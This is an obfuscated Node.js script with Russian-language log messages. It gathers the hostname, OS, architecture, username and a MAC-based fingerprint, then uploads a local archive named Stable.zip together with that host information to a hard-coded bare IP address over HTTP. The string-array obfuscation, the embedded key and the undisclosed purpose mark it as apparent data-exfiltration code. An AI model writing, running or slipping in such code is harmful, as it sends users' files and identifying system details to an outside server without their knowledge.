const _0x421b22=_0x6daa;(function(_0x476339,_0x281aad){const _0x454439=_0x6daa,_0x4ca2da=_0x476339();while(!![]){try{const _0xe7ebcb=-parseInt(_0x454439(0x16b))/0x1*(-parseInt(_0x454439(0x1a2))/0x2)+-parseInt(_0x454439(0x1a8))/0x3+parseInt(_0x454439(0x167))/0x4+-parseInt(_0x454439(0x17e))/0x5+parseInt(_0x454439(0x1a7))/0x6+parseInt(_0x454439(0x17b))/0x7+-parseInt(_0x454439(0x169))/0x8;if(_0xe7ebcb===_0x281aad)break;else _0x4ca2da['push'](_0x4ca2da['shift']());}catch(_0x1620cb){_0x4ca2da['push'](_0x4ca2da['shift']());}}}(_0x5624,0xcb67c));function _0x5624(){const _0x4a8d1b=['Начало\x20загрузки\x20файла:\x20','Размер\x20файла:\x20','Данные\x20ошибки:\x20','serverUrl','crypto','Нет\x20ответа\x20от\x20сервера','update','unknown','4120528wUeVSt','post','1086576sUPlvk','arch','1538guTazW','statSync','Начало\x20процесса\x20загрузки\x20архива','Фатальная\x20ошибка:\x20','basename','getHeaders','createReadStream','append','form-data','tJz4uRVCwl2eEwyPTudYP9iGRfgq','random','hex','Архив\x20успешно\x20загружен','КРИТИЧЕСКАЯ\x20ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ:','URL\x20сервера:\x20','Error\x20writing\x20to\x20log:\x20','4085641mSGXhm','toISOString','networkInterfaces','3329575KLZZUa','exit','readdirSync','00:00:00:00:00:00','join','keys','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','stringify','path','Полный\x20ответ\x20сервера:','\x20байт','cwd','username','appendFileSync','error','hostname','log','platform','API-ключ:\x20','substring','userInfo','data','mac','Статус\x20ошибки:\x20','status','file','size','Ошибка\x20настройки:\x20','http://92.246.137.44:8080/api/files/upload','toString','existsSync','Информация\x20о\x20системе:\x20','Не\x20удалось\x20загрузить\x20архив','axios','archiveFileName','request','974yteegf','detailed_upload.log','application/zip','Детали\x20запроса:\x20','response','1890288TxPjwV','3128892SCrrxd','message'];_0x5624=function(){return _0x4a8d1b;};return _0x5624();}const fs=require('fs'),axios=require(_0x421b22(0x19f)),FormData=require(_0x421b22(0x173)),path=require(_0x421b22(0x186)),os=require('os'),crypto=require(_0x421b22(0x1ae)),CONFIG={'serverUrl':_0x421b22(0x19a),'archiveFileName':'Stable.zip','apiKey':_0x421b22(0x174),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5};function _0x6daa(_0x3ab845,_0x2a373e){const _0x562484=_0x5624();return _0x6daa=function(_0x6daae7,_0x3e8d71){_0x6daae7=_0x6daae7-0x167;let _0x1ad47c=_0x562484[_0x6daae7];return _0x1ad47c;},_0x6daa(_0x3ab845,_0x2a373e);}function log(_0x26f85c,_0x11a9cd=![]){const _0x2633d2=_0x421b22,_0x53117d=new Date()[_0x2633d2(0x17c)](),_0x1bdd93='['+_0x53117d+']\x20'+_0x26f85c;_0x11a9cd?console[_0x2633d2(0x18c)](_0x1bdd93):console[_0x2633d2(0x18e)](_0x1bdd93);try{fs[_0x2633d2(0x18b)](_0x2633d2(0x1a3),_0x1bdd93+'\x0a');}catch(_0x269c0b){console['error'](_0x2633d2(0x17a)+_0x269c0b[_0x2633d2(0x1a9)]);}}function generateClientId(){const _0x37e50f=_0x421b22;try{const _0x2033be=getMacAddress(),_0x7efda7=os[_0x37e50f(0x18d)](),_0x13c4df=os[_0x37e50f(0x192)]()['username'],_0xfa5c21=crypto['createHash']('md5')[_0x37e50f(0x1b0)](_0x2033be+':'+_0x7efda7+':'+_0x13c4df)['digest'](_0x37e50f(0x176))[_0x37e50f(0x191)](0x0,0x8);return _0xfa5c21;}catch(_0x3f3ecd){return Math[_0x37e50f(0x175)]()[_0x37e50f(0x19b)](0x24)[_0x37e50f(0x191)](0x2,0xa);}}function getMacAddress(){const _0x5c47a0=_0x421b22;try{const _0xdffcd9=os[_0x5c47a0(0x17d)]();for(const _0x586fd5 of Object[_0x5c47a0(0x183)](_0xdffcd9)){for(const _0x38fd27 of _0xdffcd9[_0x586fd5]){if(!_0x38fd27['internal']&&_0x38fd27[_0x5c47a0(0x194)]!==_0x5c47a0(0x181))return _0x38fd27['mac'];}}return'unknown';}catch(_0x49eca1){return _0x5c47a0(0x1b1);}}async function uploadFile(){const _0x4e4271=_0x421b22;try{const _0x197f10=path['join'](process[_0x4e4271(0x189)](),CONFIG[_0x4e4271(0x1a0)]);if(!fs[_0x4e4271(0x19c)](_0x197f10))return log(_0x4e4271(0x184)+_0x197f10,!![]),log('Текущая\x20директория:\x20'+process[_0x4e4271(0x189)](),!![]),log('Содержимое\x20директории:\x20'+fs[_0x4e4271(0x180)](process[_0x4e4271(0x189)]())[_0x4e4271(0x182)](',\x20'),!![]),![];const _0x402ae2=fs[_0x4e4271(0x16c)](_0x197f10);log(_0x4e4271(0x1ab)+_0x402ae2[_0x4e4271(0x198)]+_0x4e4271(0x188));const _0x1c93f9=new FormData();_0x1c93f9[_0x4e4271(0x172)](_0x4e4271(0x197),fs[_0x4e4271(0x171)](_0x197f10),{'filename':path[_0x4e4271(0x16f)](_0x197f10),'contentType':_0x4e4271(0x1a4)});const _0x4a9c22={'hostname':os[_0x4e4271(0x18d)](),'platform':os[_0x4e4271(0x18f)](),'type':os['type'](),'arch':os[_0x4e4271(0x16a)](),'username':os[_0x4e4271(0x192)]()[_0x4e4271(0x18a)],'id':generateClientId()};log(_0x4e4271(0x1aa)+CONFIG[_0x4e4271(0x1a0)]),log(_0x4e4271(0x19d)+JSON[_0x4e4271(0x185)](_0x4a9c22)),log(_0x4e4271(0x179)+CONFIG[_0x4e4271(0x1ad)]),log(_0x4e4271(0x190)+CONFIG['apiKey']);const _0x3301d7=await axios[_0x4e4271(0x168)](CONFIG[_0x4e4271(0x1ad)],_0x1c93f9,{'headers':{..._0x1c93f9[_0x4e4271(0x170)](),'X-Client-Info':JSON[_0x4e4271(0x185)](_0x4a9c22)},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':0xea60});return log(_0x4e4271(0x187),JSON['stringify'](_0x3301d7['data'])),_0x3301d7[_0x4e4271(0x193)]['success'];}catch(_0x418077){log(_0x4e4271(0x178),!![]);if(_0x418077[_0x4e4271(0x1a6)])log(_0x4e4271(0x195)+_0x418077[_0x4e4271(0x1a6)][_0x4e4271(0x196)],!![]),log(_0x4e4271(0x1ac)+JSON[_0x4e4271(0x185)](_0x418077[_0x4e4271(0x1a6)][_0x4e4271(0x193)]),!![]);else _0x418077[_0x4e4271(0x1a1)]?(log(_0x4e4271(0x1af),!![]),log(_0x4e4271(0x1a5)+JSON[_0x4e4271(0x185)](_0x418077[_0x4e4271(0x1a1)]),!![])):log(_0x4e4271(0x199)+_0x418077[_0x4e4271(0x1a9)],!![]);return![];}}async function main(){const _0x56082a=_0x421b22;try{log(_0x56082a(0x16d));const _0x70c449=await uploadFile();_0x70c449?(log(_0x56082a(0x177)),process['exit'](0x0)):(log(_0x56082a(0x19e),!![]),process[_0x56082a(0x17f)](0x1));}catch(_0x972957){log(_0x56082a(0x16e)+_0x972957[_0x56082a(0x1a9)],!![]),process[_0x56082a(0x17f)](0x1);}}main();
